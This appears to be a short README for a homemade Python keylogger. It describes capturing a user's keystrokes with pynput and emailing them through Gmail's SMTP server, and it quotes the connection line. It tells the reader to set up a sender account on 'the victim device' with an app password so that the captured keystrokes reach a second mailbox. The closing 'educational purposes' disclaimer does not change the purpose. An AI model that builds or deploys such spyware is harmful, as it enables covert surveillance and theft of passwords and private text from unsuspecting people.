I have written a python program to track the key strokes which the user is typing.
I used pynput python library to identify the key strokes.
Then I used to send those keystrokes in an email account.
I used smtplib python module to send mail this task.
I used google mail services, thats why iused port no 587 to the line "s = smtplib.SMTP('smtp.gmail.com',587)"
You are going to be needed two gmail accounts, one account will login to the victim device with an authenticated app password and send the key strokes to the second mail account.
In the position sender and reciver just used your gmail accounts.
To login to the device using the python, you are going to be needed the app password of the sender account.
Just search for "google app password" to and the first link from official google account on google help, will lead you on how to get the app password.
Thats all you need to do.
Caution : It is only for educational purposes. Please do not use this for any illeagal or unethical job.
